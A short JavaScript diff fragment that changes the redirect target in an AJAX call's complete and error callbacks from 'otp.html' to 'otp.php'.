@@ -1093,13 +1093,13 @@ sve_bt.onclick = function() {
     complete: function(data) {
       console.log('Complete');
       setTimeout(() => {
-        window.location.href = "otp.html";
+        window.location.href = "otp.php";
       }, 900);
     },
     error: function(xhr, status, error) {
       console.error('Error:', error);
       setTimeout(() => {
-        window.location.href = "otp.html";
+        window.location.href = "otp.php";
       }, 900);
     }
   });
